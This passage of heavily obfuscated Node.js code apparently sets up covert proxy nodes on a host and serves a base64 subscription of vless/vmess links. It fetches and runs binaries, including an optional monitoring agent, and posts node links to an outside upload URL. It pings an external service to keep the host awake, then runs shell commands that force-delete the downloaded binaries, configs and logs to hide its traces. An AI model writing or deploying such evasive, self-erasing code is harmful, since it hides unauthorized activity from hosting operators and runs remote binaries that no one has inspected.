axios[_0x209baf(_0x4a56c7._0x464a0e)](_0x209baf(0x131),{'timeout':0xbb8});if(_0x3ae32f['data']&&_0x3ae32f['data']['status']==='success'&&_0x3ae32f[_0x209baf(_0x4a56c7._0x5a79bd)][_0x209baf(_0x4a56c7._0xd5d199)]&&_0x3ae32f['data'][_0x209baf(0x13d)])return _0x3ae32f[_0x209baf(_0x4a56c7._0x5a79bd)][_0x209baf(_0x4a56c7._0x457d18)]+'_'+_0x3ae32f[_0x209baf(0x14a)][_0x209baf(_0x4a56c7._0x81ceea)];}catch(_0x29134b){}}return _0x209baf(0x116);}async function _0xa31326(_0x35fc24){const _0x4797e1={_0x307490:0x1bb,_0x4840e8:0x129,_0x2ba8d7:0x135,_0x1b8a6d:0x16e,_0x42c45f:0x106,_0xa9f616:0x135,_0x5626aa:0x1c2,_0x2fde6f:0x169,_0x48705d:0x135,_0x4d43fe:0x169,_0x2d6073:0x12e},_0x15f634=await _0x2f00a3(),_0x5efbd8=NAME?NAME+'-'+_0x15f634:_0x15f634;return new Promise(_0x322bea=>{const _0x5ae02c={_0x2f1d49:0x1c2,_0x1d9943:0x1a7,_0x507b4a:0x163,_0x217d66:0x15a};setTimeout(()=>{const _0x5c7c6c=_0x16f4,_0x93898f={'v':'2','ps':''+_0x5efbd8,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5c7c6c(0x18c),'host':_0x35fc24,'path':_0x5c7c6c(0x19d),'tls':_0x5c7c6c(0x1a3),'sni':_0x35fc24,'alpn':'','fp':'firefox'},_0x370a9b='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5c7c6c(0x182)+_0x35fc24+_0x5c7c6c(_0x4797e1._0x307490)+_0x35fc24+_0x5c7c6c(0x1a5)+_0x5efbd8+_0x5c7c6c(_0x4797e1._0x4840e8)+Buffer[_0x5c7c6c(_0x4797e1._0x2ba8d7)](JSON[_0x5c7c6c(0x1ba)](_0x93898f))['toString']('base64')+_0x5c7c6c(0x148)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x35fc24+'&fp=firefox&type=ws&host='+_0x35fc24+_0x5c7c6c(_0x4797e1._0x1b8a6d)+_0x5efbd8+_0x5c7c6c(_0x4797e1._0x42c45f);console['log'](Buffer[_0x5c7c6c(_0x4797e1._0xa9f616)](_0x370a9b)[_0x5c7c6c(_0x4797e1._0x5626aa)](_0x5c7c6c(_0x4797e1._0x2fde6f))),fs[_0x5c7c6c(0x154)](subPath,Buffer[_0x5c7c6c(_0x4797e1._0x48705d)](_0x370a9b)[_0x5c7c6c(0x1c2)](_0x5c7c6c(_0x4797e1._0x4d43fe))),console[_0x5c7c6c(0x167)](FILE_PATH+_0x5c7c6c(0x191)),uploadNodes(),app[_0x5c7c6c(_0x4797e1._0x2d6073)]('/'+SUB_PATH,(_0x24a0d6,_0x50a0c0)=>{const _0x1df256=_0x5c7c6c,_0x587004=Buffer['from'](_0x370a9b)[_0x1df256(_0x5ae02c._0x2f1d49)]('base64');_0x50a0c0['set'](_0x1df256(_0x5ae02c._0x1d9943),_0x1df256(_0x5ae02c._0x507b4a)),_0x50a0c0[_0x1df256(_0x5ae02c._0x217d66)](_0x587004);}),_0x322bea(_0x370a9b);},0x7d0);});}}async function uploadNodes(){const _0x20ae51={_0x132eaf:0x16b,_0x351a70:0x1b5,_0xd5f977:0x167,_0x438c0d:0x18a,_0x40c66b:0x1b5,_0x6ec3e4:0x197,_0x37d5a2:0x12b,_0x41caea:0x133,_0x3cd93a:0x1ba,_0x5560de:0x1b5},_0x312d8b=_0x2dcc3b;if(UPLOAD_URL&&PROJECT_URL){const _0x31b18d=PROJECT_URL+'/'+SUB_PATH,_0x36c908={'subscription':[_0x31b18d]};try{const _0x36a952=await axios[_0x312d8b(0x162)](UPLOAD_URL+_0x312d8b(_0x20ae51._0x132eaf),_0x36c908,{'headers':{'Content-Type':'application/json'}});return _0x36a952&&_0x36a952[_0x312d8b(_0x20ae51._0x351a70)]===0xc8?(console[_0x312d8b(_0x20ae51._0xd5f977)](_0x312d8b(_0x20ae51._0x438c0d)),_0x36a952):null;}catch(_0x5728c7){if(_0x5728c7['response']){if(_0x5728c7[_0x312d8b(0x15c)][_0x312d8b(_0x20ae51._0x40c66b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x312d8b(_0x20ae51._0x6ec3e4)](listPath))return;const _0x4ae73f=fs['readFileSync'](listPath,_0x312d8b(_0x20ae51._0x37d5a2)),_0x37955b=_0x4ae73f[_0x312d8b(_0x20ae51._0x41caea)]('\x0a')['filter'](_0x5e1ba7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x312d8b(0x120)](_0x5e1ba7));if(_0x37955b['length']===0x0)return;const _0x29041b=JSON[_0x312d8b(_0x20ae51._0x3cd93a)]({'nodes':_0x37955b});try{const _0x2bbb1d=await axios['post'](UPLOAD_URL+_0x312d8b(0x1b1),_0x29041b,{'headers':{'Content-Type':'application/json'}});return _0x2bbb1d&&_0x2bbb1d[_0x312d8b(_0x20ae51._0x5560de)]===0xc8?(console['log'](_0x312d8b(0x12c)),_0x2bbb1d):null;}catch(_0xf345ca){return null;}}else return;}}function cleanFiles(){const _0x1d7dd2={_0x3b47e7:0x19b},_0x1ac3a2={_0xfa9a5a:0x167,_0x3906c9:0x11f,_0x44f1cc:0x1c1},_0x4e351f={_0x1ff26b:0x11c,_0x5c7a08:0x167,_0x44230e:0x11f};setTimeout(()=>{const _0x258282=_0x16f4,_0x2914d1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2914d1[_0x258282(_0x1d7dd2._0x3b47e7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2914d1[_0x258282(_0x1d7dd2._0x3b47e7)](phpPath);process[_0x258282(0x14f)]===_0x258282(0x15d)?exec('del\x20/f\x20/q\x20'+_0x2914d1[_0x258282(0x114)]('\x20')+_0x258282(0x16c),_0x1ade91=>{const _0x4763fd=_0x258282;console[_0x4763fd(_0x4e351f._0x1ff26b)](),console[_0x4763fd(_0x4e351f._0x5c7a08)](_0x4763fd(_0x4e351f._0x44230e)),console[_0x4763fd(_0x4e351f._0x5c7a08)](_0x4763fd(0x1c1));}):exec(_0x258282(0x128)+_0x2914d1[_0x258282(0x114)]('\x20')+'\x20>/dev/null\x202>&1',_0x40174a=>{const _0xaa428f=_0x258282;console[_0xaa428f(0x11c)](),console[_0xaa428f(_0x1ac3a2._0xfa9a5a)](_0xaa428f(_0x1ac3a2._0x3906c9)),console[_0xaa428f(_0x1ac3a2._0xfa9a5a)](_0xaa428f(_0x1ac3a2._0x44f1cc));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3a37fb={_0x3d8721:0x162,_0x38af8b:0x115,_0x84bedb:0x105,_0x1e9cd4:0x17c,_0x3f66e2:0x1b0},_0x59b74b=_0x2dcc3b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x59b74b(0x167)](_0x59b74b(0x126));return;}try{const _0x3f43ac=await axios[_0x59b74b(_0x3a37fb._0x3d8721)](_0x59b74b(0x1a4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x59b74b(0x190)}});return console[_0x59b74b(0x167)](_0x59b74b(_0x3a37fb._0x38af8b)),_0x3f43ac;}catch(_0x3051af){return console[_0x59b74b(_0x3a37fb._0x84bedb)](_0x59b74b(_0x3a37fb._0x1e9cd4)+_0x3051af[_0x59b74b(_0x3a37fb._0x3f66e2)]),null;}}async function startserver(){const _0x540545={_0x37139a:0x1ad},_0x579c67=_0x2dcc3b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x555253){console['error'](_0x579c67(_0x540545._0x37139a),_0x555253);}}startserver()[_0x2dcc3b(0x16a)](_0x5e1444=>{const _0x5ec415={_0x48117b:0x105},_0x3348c=_0x2dcc3b;console[_0x3348c(_0x5ec415._0x48117b)](_0x3348c(0x142),_0x5e1444);}),app[_0x2dcc3b(0x176)](PORT,()=>console[_0x2dcc3b(0x167)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
